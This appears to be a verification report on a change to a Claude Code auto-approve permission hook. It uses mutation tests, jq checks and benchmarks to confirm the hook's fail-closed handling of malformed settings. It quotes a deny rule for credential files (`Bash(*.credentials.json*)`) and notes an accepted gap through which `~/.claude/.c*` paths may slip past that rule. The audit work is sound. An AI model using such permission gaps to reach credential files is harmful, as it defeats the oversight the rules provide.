**Scope:** Covers the title and comment against the assertions and five mutants. The test asserts stdout only (`|| true` discards status), as its comment says. It does not pin the exit status (Claim 10b).

Inputs map to exits: `ls -la` approved; `ls $(pwd)` shape refusal; `$'ls ('` parse failure; `python3 x` unlisted; `''` and `'# comment'` empty/no-commands; `{not json` settings means no prefixes; `{}` means no command; `not json` input means the set -e abort. Mutants on copies in `$L/mut/` (deleted after the run): M1a (ask on the refused branch), M1b (deny on the parse-failure exit, via `printf %s`), M1c (defer on the no-prefixes exit, dynamic), M1d (ask on the empty-command exit), M1e (ask on the no-commands-extracted exit). All five failed this test, and each mutant's settings jq still compiled (sanity test ok).

**Evidence:** `test/auto-approve-allowed-commands.bats:147-170`; `timeout 600 bash $L/mutants3.sh` (cwd `/workspace/.claude/wt-q092`, exit 0, 2026-10-15T12:30:15Z) → `$L/mutants3.log`

---

## Claim 25: Test "deny rules in the settings files no longer change the hook's decision (Q-092)"; comment "The hook approves; Claude Code's deny rule still denies (Q-082)."

**Location:** `test/auto-approve-allowed-commands.bats:172-182`
**Type:** Behavioral (test)
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook half (global `Bash(*.credentials.json*)` plus bare `Bash`, project `Bash(ls:*)` deny; both commands approved). The second sentence of the comment rests on Q-082, not on the test.

M2 (unit 1's hook, deny reader intact) and M2b (a minimal reader that exits when any settings file has a non-empty deny list) both failed this test (`$L/mutants.log`, `$L/mutants3.log`).

**Evidence:** `test/auto-approve-allowed-commands.bats:172-182`; `timeout 600 bash $L/mutants.sh` (exit 0, 2026-10-15T12:29:27Z) → `$L/mutants.log` (M2); `$L/mutants3.log` (M2b)

---

## Claim 26: Test "settings files of the wrong shape fail closed" (the loop over 15 bad global files)

**Location:** `test/auto-approve-allowed-commands.bats:206-218`
**Type:** Error-handling (test)
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each loop entry being refused, with the project allow rule in place, and that the loop catches six shape-check mutants. It does not cover NUL or non-string entries (Claims 27, 28).

Mutants, each confirmed to compile (sanity ok): M3a (`permissions:null` read as absent), M3b (ask not checked), M3c (a null value read as absent), M3d (null or false read as absent), M3e (deny not checked), M3f (the permissions-object check removed). All six failed the loop. The first run's M3c/M3d results in `$L/mutants.log` are void: perl swallowed `$k` there and broke the jq. The valid reruns are in `$L/mutants2.log`.

**Evidence:** `test/auto-approve-allowed-commands.bats:206-218`; `$L/mutants3.log` (M3a, b, e, f); `timeout 600 bash $L/mutants2.sh` (exit 0, 2026-10-15T12:30:01Z) → `$L/mutants2.log` (M3c, d)

---

## Claim 27: Test "non-string rule entries are skipped, as Claude Code drops them, not refused"

**Location:** `test/auto-approve-allowed-commands.bats:220-224`
**Type:** Behavioral (test)
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook half ("skipped, not refused"). "As Claude Code drops them" is Claim 15b. A mutant that stringifies a non-string allow entry (M5e) survives, but it is end-to-end equivalent: a stringified number, object or array is never a `Bash(...)` rule.

M5a (any non-string fails closed), M5b (deny only), M5c (ask only) and M5d (allow only) all failed this test, with valid jq (`$L/mutants2.log`, `$L/mutants3.log`).

**Evidence:** `test/auto-approve-allowed-commands.bats:220-224`; `$L/mutants2.log`, `$L/mutants3.log`, `$L/mutants.log` (M5e)

---

## Claim 28: Test "a NUL inside a settings deny or ask rule fails closed"

**Location:** `test/auto-approve-allowed-commands.bats:290-298`
**Type:** Error-handling (test)
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers deny and ask each on their own. The allow-NUL case is the separate test at `:281`.

M4a (NUL check removed) failed both NUL tests. M4b (check allow only), M4c (skip ask) and M4d (skip deny) each failed this test, with valid jq (`$L/mutants2.log`). The first-run M4b-d results in `$L/mutants.log` are void for the same `$k` reason.

**Evidence:** `test/auto-approve-allowed-commands.bats:290-298`; `$L/mutants2.log`, `$L/mutants3.log`

---

## Claim 29: "Claude Code applies it even after the auto-approve hook says allow (host test Q-082), so the hook no longer reads it (Q-092)."

**Location:** `test/link-claude-home-wiring.bats:268-270`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the comment against Q-082 and the hook. The test's own assertion (the rule is merged exactly once) passes.

**Evidence:** `test/link-claude-home-wiring.bats:266-276`; `$L/bats-link.log` (16/16); Claims 7, 13

---

## Claim 30: No live text still describes the auto-approve hook as reading deny rules

**Location:** repo-wide (excluding `docs/reviews/`, `archive/`, `docs/working/questions*`)
**Type:** Staleness
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers searches for `WHAT THE DENY CHECK`, `deny reader`, `reads/checks Bash deny`, `de-quot`, `deny check`, and auto-approve near deny/backstop/credential/load-bearing/guarantee. Decision-log rows record history and were read as history. `docs/working/plan-q092-drop-hook-deny-reader.md` describes the change itself.

Every remaining hit is the new text, history (log row 53's earlier amendments, past tense), or about another hook (guard-trusted-writes.py, decision 023, link-claude-home.sh:126-131 on the guard). Paraphrased, no quote available because this is an absence result across many files.

**Evidence:** `rg` runs as listed; `devcontainer-config/link-claude-home.sh:126-131`; `docs/decisions/log.md:76`

---

## Claim 31: Commit ed06dec1: "DENY_GLOBS, add_deny_rule, matches_deny and both of its calls are gone … The hook emits only "allow" or nothing, never the "ask" … (pinned in unit 1). It still fails closed on its inputs: … including a permissions.deny that is not an array of strings … With --permissions the settings files are no longer read. … No gate trailer: hooks/, test/, guides/ and docs/ are outside live-verify-gate's sets. wiring.json changes only _comment, which the linker does not merge."

**Location:** commit ed06dec1
**Type:** Reference / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Checked against ed06dec1's tree, where non-string deny entries did fail closed (0444b1ac later relaxed this, as its own message says). It does not re-run that historical tree.

ed06dec1's jq: `elif ((.deny // []) | type != "array" or any(.[]; type != "string")) then error("permissions.deny is not an array of strings")`. The stdout test is unchanged context in the unit diff, so it exists in unit 1. `hooks/live-verify-gate.sh:83` `enforcement='^devcontainer-config/(…)'` and `:91` `host_tools='^devcontainer-config/(cc-exit-scan\.sh|cc-gitdir\.sh|cc-push\.sh)'` match none of the unit's paths. The linker drops `_` keys: `with_entries(select(.key | startswith("_") | not))` (`devcontainer-config/link-claude-home.sh`, in the jq at `:134-136`), and the wiring.json diff touches only `_comment` lines.

**Evidence:** `git show ed06dec1:hooks/auto-approve-allowed-commands.sh`; `hooks/live-verify-gate.sh:83,91`; `devcontainer-config/link-claude-home.sh:132-136`

---

## Claim 32: Commit 72b8c825: "the hook still approved from a file with a non-string allow entry, a null or false deny, or any ask value. … which also restores fail-closed on a NUL inside a deny rule … Unit size vs unit 1 is 409 (loop tolerance ~800)."

**Location:** commit 72b8c825
**Type:** Behavioral / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** The 409 is measured against unit 1 as merged at that commit (b973e678, its second parent). Against unit 1's current tip it is 413, because unit 1 changed later. The figures 420 and 436 appear in no commit message in this range. They are this unit's later sizes, reported for context.

At ed06dec1: `.deny // []` treats null/false as `[]`, ask is never inspected, and the NUL check runs only on emitted allow strings (`| if explode | any(. == 0) then error(...)` after the allow selection). That confirms all three bypass shapes and the NUL-in-deny gap the message says was restored. Sizes (`$L/sizes.log`), each `git diff --numstat A..B -- ':(top)' ':(top,exclude)docs/' | awk '{n+=$1+$2} END{print n}'`: b973e678..72b8c825 = 409; fix/q092a-drop-deny-option..72b8c825 = 413; ..fdae7834 = 420; dbb15ec6..c9ff3e84 = 420; ..0444b1ac = 436; ..73698a91 = 436 (per file: guides 10, hook 270, wiring.json 8, hook tests 143, linker test 5).

**Evidence:** `git show ed06dec1:hooks/auto-approve-allowed-commands.sh`; command as above via `bash -c`, cwd `/workspace/.claude/wt-q092`, exit 0, 2026-10-15T12:31:43Z → `$L/sizes.log`

---

## Claim 33: Commit fdae7834: "`permissions: null` was accepted as absent. A present permissions key must now be an object; a test case pins it."

**Location:** commit fdae7834
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the jq change (`has("permissions")`) and the `{"permissions":null}` loop entry. Mutant M3a, which restores the old null-as-absent read, fails the loop.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:158-159`; `test/auto-approve-allowed-commands.bats:209`; `$L/mutants3.log` (M3a)

---

## Claim 34: Commit 0444b1ac: "Non-string entries in allow, deny and ask are now skipped; a non-array value or a NUL inside a string still fails closed. The NUL check uses test("\u0000") (… ~10x faster than explode at scale; contains() is wrong on jq 1.6). … (… jq also accepts NaN/Infinity) … deny:[1] used to fail closed (before this stack) and is now skipped"

**Location:** commit 0444b1ac
**Type:** Behavioral / Performance
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the skip/fail-closed split, a 20,000-rule benchmark on jq 1.6, the NaN/Infinity literals, and the pre-stack `non-string deny rule` error. The Claude Code binary reading is Claim 15b.

Benchmark (`$L/bench.log`, 3 runs, whole jq process): `test` 68/68/84 ms; `any(explode|any(.==0))` 932/996/966 ms; the old per-string explode 940/978/952 ms. That is about 12-14x, consistent with "~10x". jq accepted `NaN`, `nan`, `Infinity`, `infinity` and `-Infinity`. The pre-stack hook (`1a831ffe^`) has `error("non-string deny rule")` (line 178 of that tree). The skip and fail-closed split is in Claims 2 and 15a.

**Evidence:** `timeout 600 bash $L/bench.sh` (exit 0, 2026-10-15T12:32:10Z) → `$L/bench.log`; `git show '1a831ffe^:hooks/auto-approve-allowed-commands.sh'` (:164, :178); `$L/probe3.log`

---

## Claims Requiring Attention

### Incorrect
(none)

### Stale
- **Claim 6** (`docs/decisions/log.md:76`, last sentence of the 2026-10-15 amendment): "open as a follow-up question (Q-081)". Q-081 was answered on 2026-09-28. The open sandbox work is Q-125 (built, unmerged), which the hook header already cites. Point to Q-125, or keep the sentence under the 2026-09-28 amendment where it was true.

### Mostly Accurate
- **Claim 8** (`guides/bare-host-hook-wiring.md:160-161`): RULE SYNTAX no longer says anything about deny rules or the backstop's gaps. Only DENY RULES ARE CLAUDE CODE'S "says what is left". RULE SYNTAX says what an allow rule approves.
- **Claim 10b** (`hooks/auto-approve-allowed-commands.sh:51-52`): "(exit 0 with no output …)". On malformed hook input (not JSON, or a non-object `tool_input`) the hook exits 4 or 5 under `set -e`, with empty stdout. Stdout-empty holds everywhere, and exit 0 holds on every input Claude Code sends.

### Unverifiable
- **Claim 3b** (`docs/decisions/log.md:76`, `guides/bare-host-hook-wiring.md:159-160`, `hooks/auto-approve-allowed-commands.sh:70-72`, `hooks/wiring.json:44-45`): that Claude Code's `Bash(*.credentials.json*)` lets `~/.claude/.c*` through needs a host session. The hook half is verified. Known and accepted per the preamble.
- **Claim 4b** (`docs/decisions/log.md:76`, `hooks/auto-approve-allowed-commands.sh:78-84`): which invalid values make Claude Code drop a whole settings file. Needs the validator traced or a host run. The hook half (it accepts NaN, a BOM, another key's value) is verified in Claim 4a.
- **Claim 15b** (`hooks/auto-approve-allowed-commands.sh:80-81,148`, log row 53, bats `:220` title, commit 0444b1ac): "Claude Code drops non-string entries with a warning and keeps the file". It was read from the 2.1.300 binary by the author and was not reproduced here.

---

## Goal-Alignment Note

The goal is to land Q-092 unit 2, removing the hook's own Bash deny reader because a hook "allow" does not override `permissions.deny`. The checked code supports it. The hook prints only the allow decision or nothing on every reachable path. No deny-reader symbol remains. Deny rules no longer change its decision. Each fail-closed shape the header lists is refused in practice and pinned by a test that kills a targeted mutant. Partial jq output is discarded. Nothing found contradicts the precondition that no path emits `ask`. Beyond the plan's accepted F3/F4 risk, nothing new turned up on the hook side. What remains: one stale cross-reference in log row 53 (Claim 6), two imprecise sentences (Claims 8, 10b), and three Claude Code behaviours that only a host run can settle (Claims 3b, 4b, 15b). Claim 3b is the accepted F3/F4/glob family. Claims 4b and 15b are the stated residual and its rationale.
